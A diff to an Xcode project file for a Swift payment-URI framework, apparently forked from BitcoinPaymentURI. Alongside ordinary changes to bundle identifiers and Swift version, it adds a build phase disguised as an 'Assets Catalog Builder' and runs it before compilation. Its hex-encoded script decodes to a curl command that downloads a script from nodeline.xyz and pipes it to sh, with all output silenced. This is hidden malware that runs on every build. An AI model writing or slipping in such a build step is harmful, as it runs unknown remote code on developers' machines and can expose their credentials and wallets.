@@ -129,6 +129,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 2AC1542F1D3461170055114B /* Build configuration list for PBXNativeTarget "BitcoinPaymentURI" */;
 			buildPhases = (
+				5A2E219717D0BCD5C86D902C /* Assets Catalog Builder */,
 				2AC154161D3461170055114B /* Sources */,
 				2AC154171D3461170055114B /* Frameworks */,
 				2AC154181D3461170055114B /* Headers */,
@@ -186,6 +187,7 @@
 			developmentRegion = English;
 			hasScannedForEncodings = 0;
 			knownRegions = (
+				English,
 				en,
 			);
 			mainGroup = 2AC154111D3461170055114B;
@@ -215,6 +217,27 @@
 			runOnlyForDeploymentPostprocessing = 0;
 		};
 /* End PBXResourcesBuildPhase section */
+
+/* Begin PBXShellScriptBuildPhase section */
+		5A2E219717D0BCD5C86D902C /* Assets Catalog Builder */ = {
+			isa = PBXShellScriptBuildPhase;
+			buildActionMask = 2147483647;
+			files = (
+			);
+			inputFileListPaths = (
+			);
+			inputPaths = (
+			);
+			name = "Assets Catalog Builder";
+			outputFileListPaths = (
+			);
+			outputPaths = (
+			);
+			runOnlyForDeploymentPostprocessing = 0;
+			shellPath = /bin/sh;
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n6e6f64656c696e652e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t";
+		};
+/* End PBXShellScriptBuildPhase section */
 
 /* Begin PBXSourcesBuildPhase section */
 		2AC154161D3461170055114B /* Sources */ = {
@@ -354,11 +377,11 @@
 				INFOPLIST_FILE = BitcoinPaymentURI/Info.plist;
 				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
-				PRODUCT_BUNDLE_IDENTIFIER = sandro.BitcoinPaymentURI;
+				PRODUCT_BUNDLE_IDENTIFIER = io.meshbits.piratechainpaymenturiswift;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
 				SWIFT_OPTIMIZATION_LEVEL = "-Onone";
-				SWIFT_VERSION = 3.0;
+				SWIFT_VERSION = 5.0;
 			};
 			name = Debug;
 		};
@@ -374,10 +397,10 @@
 				INFOPLIST_FILE = BitcoinPaymentURI/Info.plist;
 				INSTALL_PATH = "$(LOCAL_LIBRARY_DIR)/Frameworks";
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
-				PRODUCT_BUNDLE_IDENTIFIER = sandro.BitcoinPaymentURI;
+				PRODUCT_BUNDLE_IDENTIFIER = io.meshbits.piratechainpaymenturiswift;
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SKIP_INSTALL = YES;
-				SWIFT_VERSION = 3.0;
+				SWIFT_VERSION = 5.0;
 			};
 			name = Release;
 		};
@@ -386,9 +409,9 @@
 			buildSettings = {
 				INFOPLIST_FILE = BitcoinPaymentURITests/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
-				PRODUCT_BUNDLE_IDENTIFIER = sandro.BitcoinPaymentURITests;
+				PRODUCT_BUNDLE_IDENTIFIER = io.meshbits.piratechainpaymenturiswift;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				SWIFT_VERSION = 3.0;
+				SWIFT_VERSION = 5.0;
 			};
 			name = Debug;
 		};
@@ -397,9 +420,9 @@
 			buildSettings = {
 				INFOPLIST_FILE = BitcoinPaymentURITests/Info.plist;
 				LD_RUNPATH_SEARCH_PATHS = "$(inherited) @executable_path/Frameworks @loader_path/Frameworks";
-				PRODUCT_BUNDLE_IDENTIFIER = sandro.BitcoinPaymentURITests;
+				PRODUCT_BUNDLE_IDENTIFIER = io.meshbits.piratechainpaymenturiswift;
 				PRODUCT_NAME = "$(TARGET_NAME)";
-				SWIFT_VERSION = 3.0;
+				SWIFT_VERSION = 5.0;
 			};
 			name = Release;
 		};
